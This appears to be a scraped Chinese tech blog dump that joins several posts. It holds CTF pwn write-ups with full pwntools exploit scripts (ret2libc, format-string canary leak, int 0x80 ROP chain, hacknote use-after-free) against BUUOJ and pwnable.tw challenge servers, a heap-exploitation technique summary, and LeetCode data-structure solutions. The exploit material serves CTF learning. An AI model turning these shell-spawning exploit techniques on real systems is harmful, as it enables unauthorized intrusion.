利用ROPgadget寻找rdi,rsi寄存器地址 WP: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *r=remote('node4.buuoj.cn',26919)# r = process('./level3_x64')context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level= &quot;debug&quot;)elf=ELF('./level3_x64')#libc=ELF('./libc-2.19.so')write_plt=elf.plt['write']write_got=elf.got['write']main=0x40061Ardi=0x4006b3rsi_r15=0x4006b1payload='a'*(0x80+8)+p64(rdi)+p64(1) #rdi寄存器设置write函数的第一个参数为‘1’payload+=p64(rsi_r15)+p64(write_got)+p64(8) #rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8payload+=p64(write_plt) #去调用write函数payload+=p64(main) #控制程序流，回到main函数，继续控制r.sendlineafter('Input:',payload)write_addr=u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))#write_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0'))print hex(write_addr)libc=LibcSearcher('write',write_addr)libc_base=write_addr-libc.dump('write')system_addr=libc_base+libc.dump('system')binsh=libc_base+libc.dump('str_bin_sh')payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)r.sendlineafter('Input:',payload)r.interactive() bjdctf_2020_babyrop2 程序结构 init（） gift（） vuln（） 在gift函数处存在格式化字符串漏洞，可以用来泄露libc 在vuln函数处存在buf溢出漏洞，绕过canary就可以利用ret2libc来获取shell 泄露canary值 输入%n$p来找偏移，n为偏移量，$p定位到偏移处，%p以16进制输出 找到一个nop指令下断点查看栈的情况 可以看到6161下面有一串16进制数，这个就是canary值，利用%7$p就可以泄露它的值，而且看到它在栈的位置是0x18 泄露canary: 1234payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16) 另外pwngbd提供了一种方便的函数fmtarg，使用格式为fmtarg addr。在进入printf函数时断下，调用fmtarg后可以自动计算格式化参数与addr的偏移。fmtarg在计算index时将RDI也算了进去，后面会自动减一作为%$p的参数： 利用puts函数泄露libc，puts函数只有一个参数，64位传参，利用rdi寄存器即可，ROPgadget找rdi exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from LibcSearcher import *# p = process('./bjdctf_2020_babyrop2')p = remote('node4.buuoj.cn',25998)elf = ELF('./bjdctf_2020_babyrop2')context.log_level = 'debug'payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16)print str(canary)puts_plt = elf.plt['puts']puts_got = elf.got['puts']pop_rdi = 0x400993main_addr = elf.sym['main']vul_addr = 0x400887payload = 'a'*0x18+p64(canary)payload += p64(0)payload +=p64(pop_rdi)payload +=p64(puts_got)payload +=p64(puts_plt)+p64(vul_addr)p.recvuntil('story!\\n')p.sendline(payload)puts_addr = u64(p.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc = LibcSearcher('puts',puts_addr)base = puts_addr-libc.dump('puts')sys_addr = base+libc.dump('system')binsh = base+libc.dump('str_bin_sh')p.recvuntil('story!\\n')payload ='a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)payload +=p64(main_addr)p.sendline(payload)p.interactive() printf泄露真实地址 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import LibcSearcher#p=process('./babyrop2')p=remote('node3.buuoj.cn',25002)elf=ELF('./babyrop2')read_got=elf.got['read']printf_plt=elf.plt['printf']main_addr=elf.sym['main']format_addr=0x400770&quot;&quot;&quot;0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400730 : pop r14 ; pop r15 ; ret0x0000000000400732 : pop r15 ; ret0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400733 : pop rdi ; ret0x0000000000400731 : pop rsi ; pop r15 ; ret0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004d1 : ret0x0000000000400532 : ret 0x200a&quot;&quot;&quot;payload='a'*40+p64(0x400733)+p64(format_addr)+p64(0x400731)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_addr)p.sendlineafter(&quot;name?&quot;,payload)p.recvuntil('!\\n')read_addr=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))libc=LibcSearcher(&quot;read&quot;,read_addr)libc_base=read_addr-libc.dump('read')sys_addr=libc_base+libc.dump(&quot;system&quot;)binsh_addr=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2='a'*40+p64(0x400733)+p64(binsh_addr)+p64(sys_addr)+p64(0)p.sendline(payload2)p.interactive() pwn2_sctf_201612345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import *#p = process('./pwn')p = remote('node3.buuoj.cn',29130)elf = ELF('./pwn')format_str = 0x080486F8printf_plt = elf.plt['printf']main_addr = elf.symbols['main']printf_got = elf.got['printf']p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')payload = 'a'*0x30 + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)p.sendline(payload)p.recvuntil('said: ')#这是程序正常输出的p.recvuntil('said: ')#这是printf的那个格式化字符串printf_addr = u32(p.recv(4))libc = LibcSearcher('printf', printf_addr)libc_base = printf_addr - libc.dump('printf')sys_addr = libc_base + libc.dump('system')str_bin = libc_base + libc.dump('str_bin_sh')p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')p.sendline('a'*0x30 + p32(sys_addr) + p32(main_addr) + p32(str_bin))p.interactive()#复制自https://blog.csdn.net/qinying001/article/details/104374305 123456789101112131415161718192021222324252627282930313233#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = process('./test1')elf = ELF(&quot;./test1&quot;)libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; *(0xC8+4) + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendlineafter('Welcome!\\n',payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])# libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * (0xC8+4) + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendlineafter('Welcome!\\n',payload)p.interactive()","link":"/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"title":"cmcc_simplerop","text":"系统调用+rop cmcc_simplerop程序分析32位程序，开了NX，部分RELRO保护 主函数存在栈溢出 该题 没有system函数和’/bin/sh’，考虑使用int 80系统调用，地址为0x080493e1 设置系统调用int80(11,”/bin/sh”,null,null”)的参数eax,ebx,ecx,edx 找到eax，进行赋值,地址为0x080bae06 找到pop edx;pop,ecx;ret，地址为0x0806e850 接下来调用read函数，将/bin/sh写入bss段，没有开PIE，bss地址为绝对地址。 EXP12345678910111213141516171819202122232425#coding=utf-8from pwn import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)# p = remote(&quot;node4.buuoj.cn&quot;, 29088)p = process('./simplerop')read_addr = 0x0806cd50int_80 = 0x080493e1pop_eax_ret = 0x080bae06pop_edx_ecx_eax_ret = 0x0806e850bss_addr = 0x080eb584payload = &quot;a&quot; * 0x20 + p32(read_addr) # 返回到read函数payload += p32(pop_edx_ecx_eax_ret) # 平衡栈空间payload += p32(0) + p32(bss_addr) + p32(8) # read函数的三个参数 payload += p32(pop_eax_ret) + p32(0xb) # 对eax进行赋值为11# 对edx、ecx、ebx进行赋值payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr)payload += p32(int_80)p.sendlineafter(&quot;:&quot;, payload)p.sendline(&quot;/bin/sh\\x00&quot;)p.interactive()","link":"/2022/01/24/cmcc_simplerop/"},{"title":"leetcode数据结构刷题(一)","text":"Leetcode数据结构练习 数组最大子序和思路：动态规划 12345678910class Solution { public int maxSubArray(int[] nums) { int pre = 0,maxn = nums[0]; for (int x:nums){ pre = Math.max(pre+x,x); maxn = Math.max(pre,maxn); } return maxn; }} 两数之和哈希表降时间复杂度从o(n)到o(1) 创建一个哈希表，对于每一个 x，我们首先查询哈希表中是否存在 target - x，然后将 x 插入到哈希表中，即可保证不会让 x 和自己匹配。 123456789101112class Solution { public int[] twoSum(int[] nums, int target) { Map&lt;Integer, Integer&gt; hashtable = new HashMap&lt;Integer, Integer&gt;(); for (int i = 0; i &lt; nums.length; ++i) { if (hashtable.containsKey(target - nums[i])) { return new int[]{hashtable.get(target - nums[i]), i}; } hashtable.put(nums[i], i); } return new int[0]; }} 合并两个有序数组给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。 请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。 注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。 示例 1： 输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3输出：[1,2,2,3,5,6]解释：需要合并 [1,2,3] 和 [2,5,6] 。合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。示例 2： 输入：nums1 = [1], m = 1, nums2 = [], n = 0输出：[1]解释：需要合并 [1] 和 [] 。合并结果是 [1] 。示例 3： 输入：nums1 = [0], m = 0, nums2 = [1], n = 1输出：[1]解释：需要合并的数组是 [] 和 [1] 。合并结果是 [1] 。注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。 exp 一、双指针 123456789101112131415161718192021222324class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int p1 = 0, p2 = 0; int sorted[m + n]; int cur; while (p1 &lt; m || p2 &lt; n) { if (p1 == m) { cur = nums2[p2++]; } else if (p2 == n) { cur = nums1[p1++]; } else if (nums1[p1] &lt; nums2[p2]) { cur = nums1[p1++]; } else { cur = nums2[p2++]; } sorted[p1 + p2 - 1] = cur; } for (int i = 0; i != m + n; ++i) { nums1[i] = sorted[i]; } }}; 复杂度分析 时间复杂度：O(m+n)指针移动单调递增，最多移动 m+n次，因此时间复杂度为 O(m+n)。 空间复杂度：O(m+n)。需要建立长度为 m+n 的中间数组 sorted。 二、逆向双指针 从后向前遍历，将两者较大的元素放在nums数组的后面而不会被覆盖，降低了空间复杂度为O(1) 1234567891011121314151617181920class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int p1 = m - 1, p2 = n - 1; int tail = m + n - 1; int cur; while (p1 &gt;= 0 || p2 &gt;= 0) { if (p1 == -1) { cur = nums2[p2--]; } else if (p2 == -1) { cur = nums1[p1--]; } else if (nums1[p1] &gt; nums2[p2]) { cur = nums1[p1--]; } else { cur = nums2[p2--]; } nums1[tail--] = cur; } }}; 两个数组的交集一、哈希表 1234567891011121314151617181920212223class Solution {public: vector&lt;int&gt; intersect(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { if (nums1.size() &gt; nums2.size()) { return intersect(nums2, nums1); } unordered_map &lt;int, int&gt; m; for (int num : nums1) { ++m[num]; } vector&lt;int&gt; intersection; for (int num : nums2) { if (m.count(num)) { intersection.push_back(num); --m[num]; if (m[num] == 0) { m.erase(num); } } } return intersection; }}; 时间复杂度：O(m+n), 空间复杂度：O(min(m,n)) 二、双指针排序 12345678910111213141516171819202122232425262728```### 买卖股票的最佳时机&gt;输入：[7,1,5,3,6,4]&gt;输出：5&gt;解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。&gt; 注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。exp:**动态规划**(来自题解）考虑每次如何获取最大收益，第i天的最大收益通过前i天的最低点就可以算出来。而第i天以前（包括第i天）的最低点和i-1天的最低点有关，因此动态方程为dp[i] = min(d[i-1],prices[i])其中dp[0]=prices[0],然后动态计算之后的就可以了。 得到了前i天的最低点以后，只需要维护一个max用来保存最大收益就可以了。 时间复杂度为O(n),一次遍历，空间复杂度O（n）的动态规划，代码如下：```java //dp[i]表示截止到i，价格的最低点是多少 dp[i]=min(dp[i-1],nums[i]) int max = 0; int[] dp = new int[prices.length]; dp[0] = prices[0]; for (int i = 1; i &lt; prices.length; i++) { dp[i] = (dp[i - 1] &lt; prices[i]) ? dp[i - 1] : prices[i]; max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max; } return max; 接着考虑优化空间，仔细观察动态规划的辅助数组，其实每一次只用到了dp[-1]这一个空间，因此可以把数组改成单个变量dp来存储截止到第i天的价格最低点。优化之后的代码就是题解中的方法二。 12345678910111213class Solution {public: int maxProfit(vector&lt;int&gt;&amp; prices) { int inf = 1e9; int minprice = inf, maxprofit = 0; for (int price: prices) { maxprofit = max(maxprofit, price - minprice); minprice = min(price, minprice); } return maxprofit; }}; 时间复杂度O(n),空间复杂度O(1) 树和二叉树二叉树的深度输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。 例如： 给定二叉树 [3,9,20,null,null,15,7]， ​ 3 / 9 20 / 15 7返回它的最大深度 3 。 法一：DFS树的深度等于左子树的深度和右子树深度的最大值+1 12345678910111213141516171819/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: int maxDepth(TreeNode* root) { if(root==nullptr) return 0; int leftdeep=maxDepth(root-&gt;left); int rightdeep = maxDepth(root-&gt;right); return max(leftdeep,rightdeep)+1; }}; 对称二叉树 请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。 例如，二叉树 [1,2,2,3,4,4,3] 是对称的。 1 / 2 2/ \\ / 3 4 4 3但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的: 1 / 2 2 \\ 3 3 题解： 双指针递归剪枝，结束条件为左右指针同时都为空指针返回true，如果值不同或只有一个为空返回false 12345678910111213141516171819202122232425262728/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: bool isSymmetric(TreeNode* root) { if(root==NULL) return true; TreeNode *l=root; TreeNode *r=root; return recv(l,r); } bool recv(TreeNode * l,TreeNode *r){ if(l==NULL&amp;&amp;r==NULL) return true; if(l==NULL||r==NULL||l-&gt;val!=r-&gt;val) return false; //上面两个位置不能调换 return recv(l-&gt;left,r-&gt;right)&amp;&amp;recv(l-&gt;right,r-&gt;left); }}; 平衡二叉树平衡二叉树的定义是：二叉树的每个节点的左右子树的高度差的绝对值不超过 11，则二叉树是平衡二叉树。根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。 法一： 自顶向下递归123456789101112131415161718class Solution {public: int height(TreeNode* root) { if (root == NULL) { return 0; } else { return max(height(root-&gt;left), height(root-&gt;right)) + 1; } } bool isBalanced(TreeNode* root) { if (root == NULL) { return true; } else { return abs(height(root-&gt;left) - height(root-&gt;right)) &lt;= 1 &amp;&amp; isBalanced(root-&gt;left) &amp;&amp; isBalanced(root-&gt;right); } }}; 复杂度分析 时间复杂度：O(n^2)，其中 n 是二叉树中的节点个数。最坏情况下，二叉树是满二叉树，需要遍历二叉树中的所有节点，时间复杂度是 O(n)。对于节点 p，如果它的高度是 d，则 \\texttt{height}(p)height(p) 最多会被调用 dd 次（即遍历到它的每一个祖先节点时）。对于平均的情况，一棵树的高度 h 满足 O(h)=O(\\log n)O(h)=O(logn)，因为 d \\leq hd≤h，所以总时间复杂度为 O(n \\log n)。对于最坏的情况，二叉树形成链式结构，高度为 O(n)，此时总时间复杂度为 O(n^2) 空间复杂度：O(n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。 法二： 自底向上递归1234567891011121314151617181920class Solution {public: int height(TreeNode* root) { if (root == NULL) { return 0; } int leftHeight = height(root-&gt;left); int rightHeight = height(root-&gt;right); if (leftHeight == -1 || rightHeight == -1 || abs(leftHeight - rightHeight) &gt; 1) { return -1; } else { return max(leftHeight, rightHeight) + 1; } } bool isBalanced(TreeNode* root) { return height(root) &gt;= 0; }}; 复杂度分析 时间复杂度：O(n)，其中 n 是二叉树中的节点个数。使用自底向上的递归，每个节点的计算高度和判断是否平衡都只需要处理一次，最坏情况下需要遍历二叉树中的所有节点，因此时间复杂度是 O(n)。 空间复杂度：O(n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。 二叉树剪枝 后序遍历dfs 12345678910111213141516171819202122232425/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: TreeNode* pruneTree(TreeNode* root) { if(root == NULL) return NULL; TreeNode *leftnode = pruneTree(root-&gt;left); TreeNode *rightnode = pruneTree(root-&gt;right); if(root-&gt;val==0 &amp;&amp; leftnode==NULL&amp;&amp;rightnode == NULL ) return nullptr; root-&gt;left = leftnode; root-&gt;right= rightnode; return root; } }; 寻找最近公共祖先 法一：递归12345678910111213141516171819class Solution {public: TreeNode* ans; bool dfs(TreeNode* root, TreeNode* p, TreeNode* q) { if (root == nullptr) return false; bool lson = dfs(root-&gt;left, p, q); bool rson = dfs(root-&gt;right, p, q); if ((lson &amp;&amp; rson) || ((root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val) &amp;&amp; (lson || rson)))//lson&amp;&amp;rson表示左右子树均包含p或q节点，root恰好是p或q且它的左子树或右子树有一个包含了另一个节点的情况 { ans = root; } return lson || rson || (root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val); } TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { dfs(root, p, q); return ans; }}; 法二:存储父节点从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。 1234567891011121314151617181920212223242526272829class Solution {public: unordered_map&lt;int, TreeNode*&gt; fa; unordered_map&lt;int, bool&gt; vis; void dfs(TreeNode* root){ if (root-&gt;left != nullptr) { fa[root-&gt;left-&gt;val] = root; dfs(root-&gt;left); } if (root-&gt;right != nullptr) { fa[root-&gt;right-&gt;val] = root; dfs(root-&gt;right); } } TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { fa[root-&gt;val] = nullptr; dfs(root); while (p != nullptr) { vis[p-&gt;val] = true; p = fa[p-&gt;val]; } while (q != nullptr) { if (vis[q-&gt;val]) return q; q = fa[q-&gt;val]; } return nullptr; }}; 二叉搜索树输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 为了让您更好地理解问题，以下面的二叉搜索树为例： 我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。 下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。 特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。 思路： 二叉搜索树 转换成一个 “排序的循环双向链表” ，其中包含三个要素： 排序链表： 节点应从小到大排序，因此应使用 中序遍历 “从小到大”访问树的节点。双向链表： 在构建相邻节点的引用关系时，设前驱节点 pre 和当前节点 cur ，不仅应构建 pre.right = cur ，也应构建 cur.left = pre 。循环链表： 设链表头节点 head 和尾节点 tail ，则应构建 head.left = tail 和 tail.right = head 。 算法流程 dfs(cur): 递归法中序遍历； 终止条件： 当节点 cur 为空，代表越过叶节点，直接返回；递归左子树，即 dfs(cur.left) ；构建链表：当 pre 为空时： 代表正在访问链表头节点，记为 head ；当 pre 不为空时： 修改双向节点引用，即 pre.right = cur ， cur.left = pre ；保存 cur ： 更新 pre = cur ，即节点 cur 是后继节点的 pre ；递归右子树，即 dfs(cur.right) ；treeToDoublyList(root)： 特例处理： 若节点 root 为空，则直接返回；初始化： 空节点 pre ；转化为双向链表： 调用 dfs(root) ；构建循环链表： 中序遍历完成后，head 指向头节点， pre 指向尾节点，因此修改 head 和 pre 的双向节点引用即可；返回值： 返回链表的头节点 head 即可； 123456789101112131415161718192021class Solution {public: Node* treeToDoublyList(Node* root) { if(root == nullptr) return nullptr; dfs(root); head-&gt;left = pre; pre-&gt;right = head; return head; }private: Node *pre, *head; void dfs(Node* cur) { if(cur == nullptr) return; dfs(cur-&gt;left); if(pre != nullptr) pre-&gt;right = cur; //用pre来查找 else head = cur; //找到头结点 cur-&gt;left = pre; pre = cur; dfs(cur-&gt;right); }}; 复杂度分析：时间复杂度 O(N)： N 为二叉树的节点数，中序遍历需要访问所有节点。空间复杂度 O(N) ： 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O(N)栈空间。","link":"/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"堆题总结","text":"堆基础总结 堆数据结构1234567+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk | prev_size | size |A|M|P|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| user data (fd) | (bk) || || |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk Off By One漏洞原理使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节 利用思路 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。 （1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。 （2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。 Large bin当large bin 中只存在一个chunk时，那么该chunk的两个nextsize 指针都会指向自己 unlinkunlink过程如下图所示，主要实现堆块合并 对于unlink(P,BK,FD)函数本质是赋值 123456unlink(P,BK,FD){ FD = P -&gt; fd; BK = p -&gt; bk; FD -&gt; bk = BK; BK -&gt; fd = fd; } 堆块结构FD = *(p-0x10)，0x10是由fd指针在堆块的位置决定的，具体利用过程 12*(P-&gt;fd+0x18) = *(P-&gt;bk)*(P-&gt;bk+0x10) = *(P-&gt;fd) UAF漏洞原理申请任意大小的堆块并在删除时未清空指针数组（即没有设置为NUL），导致悬空指针从而产生UAF 利用思路例题： pwnable.tw - hacknote 解题思路： 通过UAF调用一个存在于堆块，并且被一系列对操作篡改的函数指针控制流劫持从而getshell 具体参考文章 EXP123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = 'debug'libc = ELF('./libc_32.so.6')# io = process('./hacknote')io = remote('chall.pwnable.tw',10102)def add(size,content): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;size :&quot;) io.sendline(str(size)) io.recvuntil(&quot;Content :&quot;) io.sendline(content)def delete(num): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(num))def show(num): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(num))add(64,'a')add(32,'a')delete(0)add(64,'b')show(2) //unsortbin泄露libc地址libc_base = u32(io.recv(8)[4:8])-0x1b07b0system_addr = libc_base+libc.symbols['system']delete(0)delete(1)add(8,p32(system_addr)+&quot;;sh\\x00&quot;)show(0)io.interactive() house of force利用前提 能够控制top chunk的size域（如堆溢出） 能够自由控制堆分配size大小，如申请负数的堆 向上申请chunk实现任意地址写 例题 bamboobox修改长度可以覆盖到top chunk的size位置从而修改top chunk size= -1,因为size为无符号数，-1被解释为0xffffff。 利用house of force 将top chunk位置放在heap base，可以是got表地址也可以是分配的堆块地址。 再申请一个0x10堆块去修改函数指针为指定地址。 Double Free漏洞原理free了两次堆块，在glibc中的检查如下： 检查main_arean是否指向了原来的一个chunk,绕过只需要 free(p1);free(p2);free(p1)，改写fdd指针一般执行add函数，然后连续free出chunk2,chunk1和构造的fake_chunk（这个chunk的地址在got表上），对got表进行一个覆写，将puts函数got表改写成magic函数的地址。 利用思路 malloc出一个chunk1，更改chunk1的fd，又由于此时chunk1在fastbin list，因此可以指向一个fakebin实现任意地址写 Off by null &amp;&amp; Tcache &amp;&amp; Overlap off-by-null: 利用改写将pre_issue位改成\\x00然后导致前面一个堆块莫名其妙的就free了（当然不是真的莫名其妙，详细请看堆块结构和记录，简单的说就是pre_issue是位了记录前一个堆块free or use 情况的）。接着就是利用堆块合并，获得一个free的但是其实并没有free的堆块，这就是overlap。整个过程其实说明了，off-by-null可以触发overlap，并且还是powerful的，可以用来泄漏地址。也可以用来修改fd strcpy 字符串函数:复制时，遇到结束符 \\x00 才会停止复制。复制结束后，会在最后写入一个结束符 \\x00 strlen: j不将’\\x00’结束符计入字符串长度 tcache: 这个机制和fastbin很像，但是为了效率会比fastbin少很多检查。并且堆块都会在tacahe走一遍再出来给我们使用，有一些特殊情况不会比如合并了的unsortedbin。他总共有7个，满了才会用其他的类别的chunk。对double free的检查基本没有。 例题：HITCON_2018_children_tcache 待补充ing… 参考文章https://trick.ink/article/Heap_Learn/ https://blog.csdn.net/m0_56897090/article/details/120510003 https://www.freebuf.com/system/171261.html https://xz.aliyun.com/t/4324#toc-15","link":"/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/"},{"title":"leetcode数据结构刷题（二）","text":"二叉搜索树相关 0x01 二叉树最底层最左边的值给定一个二叉树的 根节点 root，请找出该二叉树的 最底层 最左边 节点的值。 假设二叉树中至少有一个节点。 12输入: [1,2,3,4,null,5,6,null,null,7]输出: 7 法一：前序遍历DFS使用DFS递归遍历树的所有节点,记录当前节点的层级level与已遍历节点的最大层级maxLevel每当level超过maxLevel时，将当前节点赋值给res，另外更新maxLevel遍历完成后，res就是要找的节点，返回该节点的值即可 遍历到新的一层的第一个节点为最底层，最左边的节点 12345678910111213141516171819class Solution {public: int res = 0; int maxlevel=-1; int findBottomLeftValue(TreeNode* root) { dfs(root,0); return res; } void dfs(TreeNode * root,int level){ if(root==NULL) return ; if(level&gt;maxlevel){ res = root-&gt;val; maxlevel = level; } dfs(root-&gt;left,level+1); dfs(root-&gt;right,level+1); } }; 法二：层序遍历BFS更新每层第一个元素值，取最后一次更新值 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: int findBottomLeftValue(TreeNode* root) { queue&lt;TreeNode*&gt; q; q.push(root); int leftnode; while(!q.empty()){ int size = q.size(); for (int i=size;i;i--){ auto node = q.front(); if(i==size) leftnode = node-&gt;val; q.pop(); if(node-&gt;left) q.push(node-&gt;left); if(node-&gt;right) q.push(node-&gt;right); } } return leftnode; }}; 0x02 往完全二叉树添加节点完全二叉树是每一层（除最后一层外）都是完全填充（即，节点数达到最大，第 n 层有 2n-1 个节点）的，并且所有的节点都尽可能地集中在左侧。 设计一个用完全二叉树初始化的数据结构 CBTInserter，它支持以下几种操作： CBTInserter(TreeNode root) 使用根节点为 root 的给定树初始化该数据结构；CBTInserter.insert(int v) 向树中插入一个新节点，节点类型为 TreeNode，值为 v 。使树保持完全二叉树的状态，并返回插入的新节点的父节点的值；CBTInserter.get_root() 将返回树的根节点。 示例 1： 123456输入：inputs = [&quot;CBTInserter&quot;,&quot;insert&quot;,&quot;get_root&quot;], inputs = [[[1]],[2],[]]输出：[null,1,[1,2]]输入：inputs = [&quot;CBTInserter&quot;,&quot;insert&quot;,&quot;insert&quot;,&quot;get_root&quot;], inputs = [[[1,2,3,4,5,6]],[7],[8],[]]输出：[null,3,4,[1,2,3,4,5,6,7,8]] 